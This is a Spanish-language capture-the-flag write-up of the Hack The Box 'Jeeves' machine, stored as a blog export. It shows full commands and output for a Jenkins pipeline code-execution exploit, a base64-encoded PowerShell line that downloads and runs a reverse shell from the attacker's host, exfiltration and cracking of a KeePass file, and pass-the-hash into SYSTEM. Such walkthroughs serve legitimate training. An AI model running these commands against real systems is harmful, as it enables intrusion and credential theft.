            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p80,135,445,50000 -vvv -sCV -n -Pn 10.10.10.63 -oG targeted\\nPORT      STATE SERVICE      REASON          VERSION\\n80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0\\n|_http-title: Ask Jeeves\\n|_http-server-header: Microsoft-IIS/10.0\\n445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\\n50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT\\n|_http-title: Error 404 Not Found\\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nHost script results:\\n| smb2-time: \\n|   date: 2022-02-12T22:04:41\\n|_  start_date: 2022-02-12T21:50:58\\n| smb-security-mode: \\n|   account_used: guest\\n|   authentication_level: user\\n|   challenge_response: supported\\n|_  message_signing: disabled (dangerous, but default)\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ crackmapexec smb 10.10.10.63\\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-17.png\",\"width\":649,\"height\":298}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\"http://10.10.10.63:50000/FUZZ\\\"\\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\\n********************************************************\\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\\n********************************************************\\nTarget: http://10.10.10.63:50000/FUZZ\\nTotal requests: 220560\\n=====================================================================\\nID           Response   Lines    Word       Chars       Payload \\n=====================================================================\\n000041607:   302        0 L      0 W        0 Ch        \\\"askjeeves\\\"\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-18.png\",\"width\":827,\"height\":496}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-19.png\",\"width\":731,\"height\":391}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-20.png\",\"width\":882,\"height\":224}],[\"code\",{\"language\":\"sh\",\"code\":\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\"}],[\"code\",{\"language\":\"powershell\",\"code\":\"❯ echo \\\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\\\">data\\n❯ cat data | iconv -t utf-16le | xxd\\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\\n00000090: 2900 0a00                                )...\\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==powershell\"}],[\"code\",{\"language\":\"sh\",\"code\":\"node {\\n   powershell 'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA=='\\n}\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-21.png\",\"width\":969,\"height\":465}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ rlwrap nc -nlvp 443\\nlistening on [any] 443 ...\\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.10.63] 49685\\nWindows PowerShell running as user kohsuke on JEEVES\\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\\n\\nPS C:\\\\Users\\\\Administrator\\\\.jenkins\\\\workspace\\\\test> whoami\\njeeves\\\\kohsuke\\nPS C:\\\\Users\\\\Administrator\\\\.jenkins\\\\workspace\\\\test> cat C:\\\\Users\\\\kohsuke\\\\Desktop\\\\user.txt    \\ne323xxxxxxxxxxxxxxxxxxxxxxxxxxx\"}],[\"code\",{\"language\":\"sh\",\"code\":\"PS C:\\\\Users\\\\kohsuke\\\\Documents>ls\\nCEH.kdbx\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ impacket-smbserver smbFolder $(pwd) -smb2support\"}],[\"code\",{\"language\":\"sh\",\"code\":\"PS C:\\\\Users\\\\kohsuke\\\\Documents>copy CEH.kdbx \\\\\\\\10.10.14.21\\\\smbFolder\\\\CEH.kdbx\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ keepass2john CEH.kdbx > hash\\n❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash\\n❯ john -show hash\\nCEH:mooxxxxx\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-22.png\",\"width\":908,\"height\":625}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ crackmapexec smb 10.10.10.63 -u \\\"Administrator\\\" -H \\\"e0fbxxxxxxxxxxxxxxxxxxx\\\"\\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\\nSMB         10.10.10.63     445    JEEVES           [+] Jeeves\\\\Administrator e0fbxxxxxxxxxxxxxxxx (Pwn3d!)\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ psexec.py WORKGROUP/administrator@10.10.10.63 -hashes :e0fbxxxxxxxxxxxxxxxxxxxxxx\\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\\n\\n...\\nMicrosoft Windows [Version 10.0.10586]\\n(c) 2015 Microsoft Corporation. All rights reserved.\\n\\nC:\\\\Windows\\\\system32> whoami\\nnt authority\\\\system\"}],[\"code\",{\"language\":\"sh\",\"code\":\"C:\\\\Users\\\\Administrator\\\\Desktop> type hm.txt\\nThe flag is elsewhere.  Look deeper.\"}],[\"code\",{\"language\":\"sh\",\"code\":\"C:\\\\Users\\\\Administrator\\\\Desktop> dir /r\\n Directory of C:\\\\Users\\\\Administrator\\\\Desktop\\n\\n11/08/2017  09:05 AM    <DIR>          .\\n11/08/2017  09:05 AM    <DIR>          ..\\n12/24/2017  02:51 AM                36 hm.txt\\n                                    34 hm.txt:root.txt:$DATA\\n\\nC:\\\\Users\\\\Administrator\\\\Desktop> more < hm.txt:root.txt\\nafbcxxxxxxxxxxxxxx\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://cxsecurity.com/issue/WLB-2019020120\"]],[\"a\",[\"href\",\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\"]],[\"a\",[\"href\",\"https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2\"]],[\"a\",[\"href\",\"https://wikipedia.org/wiki/UTF-16\"]],[\"a\",[\"href\",\"https://www.file-extension.info/es/format/kdbx\"]],[\"a\",[\"href\",\"https://www.openwall.com/john/\"]],[\"a\",[\"href\",\"https://www.quora.com/How-many-passwords-are-in-rockyou-txt#:~:text=The%20rockyou.txt%20that%20comes,2020.2a%20contains%2014%2C442%2C063%20words.\"]],[\"a\",[\"href\",\"https://keepassxc.org/\"]],[\"a\",[\"href\",\"https://security.stackexchange.com/questions/161889/understanding-windows-local-password-hashes-ntlm\"]],[\"strong\"],[\"a\",[\"href\",\"https://www.deepinstinct.com/blog/the-abuse-of-alternate-data-stream-hasnt-disappeared\"]],[\"a\",[\"href\",\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Escaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos. Omitiré la información no relevante.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Lo primero que observamos es que la firma de smb no es necesaria. A continuación, lo validamos con \"],[0,[0],1,\"crackmapexec\"],[0,[],0,\".\"]]],[10,1],[1,\"p\",[[0,[],0,\"Estamos ante una máquina Win10 x64 y SMB no está firmado. Esto lo hace potencialmente vulnerable a un ataque de tipo PassTheHash. Continuamos investigando. Entrando en la web y aparece la siguiente imagen.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Cuando buscas algo, siempre sale la misma ventana de error que no es un error como tal, es un archivo png. No parece que se esté ejecutando nada.\"]]],[1,\"p\",[[0,[],0,\"Aplico Fuzzing contra el puerto 80 y el puerto 50000. En este segundo puerto, parece que encuentro una ruta disponible en \"],[0,[0],1,\"/askjeeves\"],[0,[],0,\".\"]]],[10,3],[1,\"p\",[[0,[],0,\"Accedo a la URL y encuentro un Jenkins de v2.87.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Encontramos una \"],[0,[1],1,\"vulnerabilidad \"],[0,[],0,\"con el pipeline de Jenkins para esa versión. Hacemos una prueba rápida colocando un comando en la ventana de configuración del pipeline.\"]]],[10,5],[1,\"p\",[[0,[0],1,\"Es importante seleccionar el Sandbox de Groovy que es quien tiene la vulnerabilidad\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Ponemos en escucha \"],[0,[0],1,\"tcpdump \"],[0,[],0,\"y vemos si hay respuesta cuando ejecutamos el pipeline.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Se acontece la vulnerabilidad. Modificamos el script de arriba para que nos entable una reverse shell.\"]]],[1,\"p\",[[0,[],0,\"Para ello, vamos a enviar a la consola de Powershell un código codificado en base64. El código en cuestión es el siguiente.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Esto descargará un script desde nuestro equipo y lo ejecutará en el entorno remoto. Dicho script contiene una reverse shell descargada del repositorio de \"],[0,[2],1,\"Nishang\"],[0,[],0,\" que modificaremos a nuestro gusto.\"]]],[1,\"p\",[[0,[],0,\"La forma de codificarlo a base64 pasa por cambiar el encoding a UTF-16LE si queremos tener en consideración a \"],[0,[3],1,\"Microsoft\"],[0,[],0,\". De lo contrario, probablemente no podrá ejecutar nuestro comando.\"]]],[1,\"blockquote\",[[0,[],0,\"En general, Windows PowerShell tiene configurada la codificación UNICODE \"],[0,[4],1,\"UTF-16LE\"],[0,[],0,\" de forma predeterminada.\"]]],[1,\"p\",[[0,[],0,\"Para ello, ejecutamos el siguiente código.\"]]],[10,8],[1,\"p\",[[0,[],0,\"Copiamos el código final en base64 y lo adjuntamos a nuestro exploit del pipeline de Jenkins.\"]]],[10,9],[1,\"p\",[[0,[],0,\"Ponemos un servidor en nuestro equipo que acepte la descarga del script y en otra ventana netcat en escucha en el puerto 443.\"]]],[1,\"p\",[[0,[],0,\"Ejecutamos el pipeline en Jenkins.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Recibimos la consola de nuestro lado.\"]]],[10,11],[1,\"p\",[[0,[],0,\"Obtenemos la primera flag y continuamos con el escalado de privilegios.\"]]],[1,\"p\",[[0,[],0,\"En la carpeta documentos del usuario, descubrimos un archivo kdbx. Esta extensión pertenece a \"],[0,[5],1,\"KeePass\"],[0,[],0,\".\"]]],[10,12],[1,\"p\",[[0,[],0,\"Para descargarnos el archivo a nuestro equipo, montamos un servidor samba.\"]]],[10,13],[1,\"p\",[[0,[],0,\"Y nos copiamos el archivo directamente en nuestro equipo.\"]]],[10,14],[1,\"p\",[[0,[],0,\"Primero obtenemos el hash de la contraseña con \"],[0,[0],1,\"keepass2john\"],[0,[],0,\", ejecutamos \"],[0,[0,6],2,\"John The Ripper\"],[0,[],0,\" con el diccionario \"],[0,[7],1,\"Rockyou\"],[0,[],0,\" que contiene más de 14 millones de las contraseñas más utilizadas y mostramos los resultados.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Parece que los resultados han sido positivos. Usamos la contraseña para abrir el archivo \"],[0,[0],1,\"kdbx \"],[0,[],0,\"en un cliente de KeePass como \"],[0,[8],1,\"KeePassXC\"],[0,[],0,\".\"]]],[10,16],[1,\"p\",[[0,[],0,\"La entrada seleccionada en la imagen contiene una contraseña que parece ser un hash \"],[0,[9],1,\"NTLM\"],[0,[],0,\" del usuario administrador. Validamos el hash con \"],[0,[0],1,\"crackmapexec\"],[0,[],0,\".\"]]],[10,17],[1,\"p\",[[0,[10],1,\"Como aparece la palabra (Pwn3d!), confirmamos que el hash es correcto.\"]]],[1,\"p\",[[0,[],0,\"A continuación, ejecutamos \"],[0,[0],1,\"psexec.py \"],[0,[],0,\"para entablar una shell.\"]]],[10,18],[1,\"p\",[[0,[],0,\"Estamos dentro como usuario Administrator y buscamos la flag.\"]]],[1,\"p\",[[0,[],0,\"En el escritorio encontramos un archivo que nos dice que lo que buscamos está en algún otro sitio más profundo.\"]]],[10,19],[1,\"p\",[[0,[],0,\"NTFS tiene la posibilidad de almacenar la información en distintos streams de datos. Se puede encontrar más información \"],[0,[11],1,\"aquí\"],[0,[],0,\". Para enumerar todos los archivos/streams de archivos se emplea el parámetro /r.\"]]],[1,\"p\",[[0,[],0,\"Después, invocamos el comando \"],[0,[12],1,\"more\"],[0,[],0,\" de Powershell para ver el siguiente stream de información. \"]]],[10,20],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Escaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos. Omitiré la información no relevante.</p><pre><code class=\"language-sh\">nmap -p80,135,445,50000 -vvv -sCV -n -Pn 10.10.10.63 -oG targeted\nPORT      STATE SERVICE      REASON          VERSION\n80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-title: Ask Jeeves\n|_http-server-header: Microsoft-IIS/10.0\n445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-02-12T22:04:41\n|_  start_date: 2022-02-12T21:50:58\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)</code></pre><p>Lo primero que observamos es que la firma de smb no es necesaria. A continuación, lo validamos con <em>crackmapexec</em>.</p><pre><code class=\"language-sh\">❯ crackmapexec smb 10.10.10.63\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)</code></pre><p>Estamos ante una máquina Win10 x64 y SMB no está firmado. Esto lo hace potencialmente vulnerable a un ataque de tipo PassTheHash. Continuamos investigando. Entrando en la web y aparece la siguiente imagen.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-17.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"649\" height=\"298\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-17.png 600w, __GHOST_URL__/content/images/2022/02/image-17.png 649w\"></figure><p>Cuando buscas algo, siempre sale la misma ventana de error que no es un error como tal, es un archivo png. No parece que se esté ejecutando nada.</p><p>Aplico Fuzzing contra el puerto 80 y el puerto 50000. En este segundo puerto, parece que encuentro una ruta disponible en <em>/askjeeves</em>.</p><pre><code class=\"language-sh\">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://10.10.10.63:50000/FUZZ\"\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://10.10.10.63:50000/FUZZ\nTotal requests: 220560\n=====================================================================\nID           Response   Lines    Word       Chars       Payload \n=====================================================================\n000041607:   302        0 L      0 W        0 Ch        \"askjeeves\"</code></pre><p>Accedo a la URL y encuentro un Jenkins de v2.87.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-18.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"827\" height=\"496\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-18.png 600w, __GHOST_URL__/content/images/2022/02/image-18.png 827w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Encontramos una <a href=\"https://cxsecurity.com/issue/WLB-2019020120\">vulnerabilidad </a>con el pipeline de Jenkins para esa versión. Hacemos una prueba rápida colocando un comando en la ventana de configuración del pipeline.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-19.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"731\" height=\"391\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-19.png 600w, __GHOST_URL__/content/images/2022/02/image-19.png 731w\" sizes=\"(min-width: 720px) 720px\"></figure><p><em>Es importante seleccionar el Sandbox de Groovy que es quien tiene la vulnerabilidad</em>.</p><p>Ponemos en escucha <em>tcpdump </em>y vemos si hay respuesta cuando ejecutamos el pipeline.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-20.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"882\" height=\"224\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-20.png 600w, __GHOST_URL__/content/images/2022/02/image-20.png 882w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Se acontece la vulnerabilidad. Modificamos el script de arriba para que nos entable una reverse shell.</p><p>Para ello, vamos a enviar a la consola de Powershell un código codificado en base64. El código en cuestión es el siguiente.</p><pre><code class=\"language-sh\">IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')</code></pre><p>Esto descargará un script desde nuestro equipo y lo ejecutará en el entorno remoto. Dicho script contiene una reverse shell descargada del repositorio de <a href=\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\">Nishang</a> que modificaremos a nuestro gusto.</p><p>La forma de codificarlo a base64 pasa por cambiar el encoding a UTF-16LE si queremos tener en consideración a <a href=\"https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2\">Microsoft</a>. De lo contrario, probablemente no podrá ejecutar nuestro comando.</p><blockquote>En general, Windows PowerShell tiene configurada la codificación UNICODE <a href=\"https://wikipedia.org/wiki/UTF-16\">UTF-16LE</a> de forma predeterminada.</blockquote><p>Para ello, ejecutamos el siguiente código.</p><pre><code class=\"language-powershell\">❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\"&gt;data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==powershell</code></pre><p>Copiamos el código final en base64 y lo adjuntamos a nuestro exploit del pipeline de Jenkins.</p><pre><code class=\"language-sh\">node {\n   powershell 'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA=='\n}</code></pre><p>Ponemos un servidor en nuestro equipo que acepte la descarga del script y en otra ventana netcat en escucha en el puerto 443.</p><p>Ejecutamos el pipeline en Jenkins.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-21.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"969\" height=\"465\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-21.png 600w, __GHOST_URL__/content/images/2022/02/image-21.png 969w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Recibimos la consola de nuestro lado.</p><pre><code class=\"language-sh\">❯ rlwrap nc -nlvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.10.63] 49685\nWindows PowerShell running as user kohsuke on JEEVES\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test&gt; whoami\njeeves\\kohsuke\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test&gt; cat C:\\Users\\kohsuke\\Desktop\\user.txt    \ne323xxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre><p>Obtenemos la primera flag y continuamos con el escalado de privilegios.</p><p>En la carpeta documentos del usuario, descubrimos un archivo kdbx. Esta extensión pertenece a <a href=\"https://www.file-extension.info/es/format/kdbx\">KeePass</a>.</p><pre><code class=\"language-sh\">PS C:\\Users\\kohsuke\\Documents&gt;ls\nCEH.kdbx</code></pre><p>Para descargarnos el archivo a nuestro equipo, montamos un servidor samba.</p><pre><code class=\"language-sh\">❯ impacket-smbserver smbFolder $(pwd) -smb2support</code></pre><p>Y nos copiamos el archivo directamente en nuestro equipo.</p><pre><code class=\"language-sh\">PS C:\\Users\\kohsuke\\Documents&gt;copy CEH.kdbx \\\\10.10.14.21\\smbFolder\\CEH.kdbx</code></pre><p>Primero obtenemos el hash de la contraseña con <em>keepass2john</em>, ejecutamos <em><a href=\"https://www.openwall.com/john/\">John The Ripper</a></em> con el diccionario <a href=\"https://www.quora.com/How-many-passwords-are-in-rockyou-txt#:~:text=The%20rockyou.txt%20that%20comes,2020.2a%20contains%2014%2C442%2C063%20words.\">Rockyou</a> que contiene más de 14 millones de las contraseñas más utilizadas y mostramos los resultados.</p><pre><code class=\"language-sh\">❯ keepass2john CEH.kdbx &gt; hash\n❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n❯ john -show hash\nCEH:mooxxxxx</code></pre><p>Parece que los resultados han sido positivos. Usamos la contraseña para abrir el archivo <em>kdbx </em>en un cliente de KeePass como <a href=\"https://keepassxc.org/\">KeePassXC</a>.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-22.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"908\" height=\"625\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-22.png 600w, __GHOST_URL__/content/images/2022/02/image-22.png 908w\" sizes=\"(min-width: 720px) 720px\"></figure><p>La entrada seleccionada en la imagen contiene una contraseña que parece ser un hash <a href=\"https://security.stackexchange.com/questions/161889/understanding-windows-local-password-hashes-ntlm\">NTLM</a> del usuario administrador. Validamos el hash con <em>crackmapexec</em>.</p><pre><code class=\"language-sh\">❯ crackmapexec smb 10.10.10.63 -u \"Administrator\" -H \"e0fbxxxxxxxxxxxxxxxxxxx\"\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\nSMB         10.10.10.63     445    JEEVES           [+] Jeeves\\Administrator e0fbxxxxxxxxxxxxxxxx (Pwn3d!)</code></pre><p><strong>Como aparece la palabra (Pwn3d!), confirmamos que el hash es correcto.</strong></p><p>A continuación, ejecutamos <em>psexec.py </em>para entablar una shell.</p><pre><code class=\"language-sh\">❯ psexec.py WORKGROUP/administrator@10.10.10.63 -hashes :e0fbxxxxxxxxxxxxxxxxxxxxxx\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\n...\nMicrosoft Windows [Version 10.0.10586]\n(c) 2015 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system</code></pre><p>Estamos dentro como usuario Administrator y buscamos la flag.</p><p>En el escritorio encontramos un archivo que nos dice que lo que buscamos está en algún otro sitio más profundo.</p><pre><code class=\"language-sh\">C:\\Users\\Administrator\\Desktop&gt; type hm.txt\nThe flag is elsewhere.  Look deeper.</code></pre><p>NTFS tiene la posibilidad de almacenar la información en distintos streams de datos. Se puede encontrar más información <a href=\"https://www.deepinstinct.com/blog/the-abuse-of-alternate-data-stream-hasnt-disappeared\">aquí</a>. Para enumerar todos los archivos/streams de archivos se emplea el parámetro /r.</p><p>Después, invocamos el comando <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more\">more</a> de Powershell para ver el siguiente stream de información. </p><pre><code class=\"language-sh\">C:\\Users\\Administrator\\Desktop&gt; dir /r\n Directory of C:\\Users\\Administrator\\Desktop\n\n11/08/2017  09:05 AM    &lt;DIR&gt;          .\n11/08/2017  09:05 AM    &lt;DIR&gt;          ..\n12/24/2017  02:51 AM                36 hm.txt\n                                    34 hm.txt:root.txt:$DATA\n\nC:\\Users\\Administrator\\Desktop&gt; more &lt; hm.txt:root.txt\nafbcxxxxxxxxxxxxxx</code></pre>",
            "comment_id": "6207e6225a95d40061bbbadf",
            "plaintext": "Escaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos. Omitiré la información no relevante.\n\nnmap -p80,135,445,50000 -vvv -sCV -n -Pn 10.10.10.63 -oG targeted\nPORT      STATE SERVICE      REASON          VERSION\n80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-title: Ask Jeeves\n|_http-server-header: Microsoft-IIS/10.0\n445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-02-12T22:04:41\n|_  start_date: 2022-02-12T21:50:58\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nLo primero que observamos es que la firma de smb no es necesaria. A continuación, lo validamos con crackmapexec.\n\n❯ crackmapexec smb 10.10.10.63\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\n\nEstamos ante una máquina Win10 x64 y SMB no está firmado. Esto lo hace potencialmente vulnerable a un ataque de tipo PassTheHash. Continuamos investigando. Entrando en la web y aparece la siguiente imagen.\n\nCuando buscas algo, siempre sale la misma ventana de error que no es un error como tal, es un archivo png. No parece que se esté ejecutando nada.\n\nAplico Fuzzing contra el puerto 80 y el puerto 50000. En este segundo puerto, parece que encuentro una ruta disponible en /askjeeves.\n\n❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://10.10.10.63:50000/FUZZ\"\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://10.10.10.63:50000/FUZZ\nTotal requests: 220560\n=====================================================================\nID           Response   Lines    Word       Chars       Payload \n=====================================================================\n000041607:   302        0 L      0 W        0 Ch        \"askjeeves\"\n\nAccedo a la URL y 